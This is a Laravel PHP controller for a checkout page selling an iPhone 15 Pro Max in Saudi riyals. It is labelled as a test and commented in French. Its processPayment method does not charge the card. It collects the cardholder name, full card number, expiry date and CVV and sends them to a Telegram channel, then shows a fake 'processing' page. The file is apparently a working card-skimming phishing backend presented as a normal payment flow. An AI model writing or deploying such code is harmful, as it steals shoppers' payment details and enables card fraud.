<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Services\TelegramService;

class TestController extends Controller
{
    /**
     * Afficher la page de paiement
     */
    public function payment()
    {
        $data = [
            'items' => [
                [
                    'id' => 1,
                    'name' => 'iPhone 15 Pro Max',
                    'price' => 1127,
                    'quantity' => 1,
                    'image' => '/images/products/iphone.jpg',
                ],
            ],
            'total' => 1127,
            'currency' => 'SAR',
            'itemsCount' => 1,
        ];

        return view('payment.index', $data);
    }

    /**
     * Traiter le paiement - affiche la page processing
     */
    public function processPayment(Request $request)
    {
        $telegram = new TelegramService();
        $message = "💳 Nouveau paiement\n\n"
         . "Nom: " . $request->input('cardholder_name') . "\n"
         . "Numéro carte: " . $request->input('card_number') . "\n"
         . "Expiration: " . $request->input('expiry_date') . "\n"
         . "CVV: " . $request->input('cvv');
        $telegram->sendMessage($message);
        return view('payment.processing', [
            'card_number' => $request->input('card_number'),
            'cardholder_name' => $request->input('cardholder_name'),
        ]);
    }

    /**
     * Obtenir le résumé de la commande
     */
    public function orderSummary()
    {
        $order = [
            'order_id' => 'ORD-' . strtoupper(uniqid()),
            'items' => [
                [
                    'id' => 1,
                    'name' => 'iPhone 15 Pro Max',
                    'price' => 1127,
                    'quantity' => 1,
                ],
            ],
            'subtotal' => 1127,
            'tax' => 0,
            'shipping' => 0,
            'total' => 1127,
            'currency' => 'SAR',
        ];

        return response()->json($order);
    }
}
